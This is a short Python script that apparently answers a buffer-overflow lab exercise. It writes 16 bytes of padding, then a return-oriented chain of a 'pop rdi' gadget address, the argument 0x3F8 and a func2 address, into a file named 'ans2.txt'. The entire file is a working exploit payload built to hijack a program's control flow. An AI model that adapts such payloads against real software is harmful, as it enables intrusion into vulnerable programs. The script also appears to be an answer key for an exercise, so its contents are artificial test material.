import struct

padding = b"A" * 16
# pop_rdi
pop_rdi_addr = 0x4012C7
arg_val = 0x3F8
#  func2
func2_addr = 0x401216

# Padding + pop_rdi +参数值+func2
rop_chain = struct.pack("<Q", pop_rdi_addr)
rop_chain += struct.pack("<Q", arg_val)
rop_chain += struct.pack("<Q", func2_addr)

payload = padding + rop_chain

with open("ans2.txt", "wb") as f:
    f.write(payload)
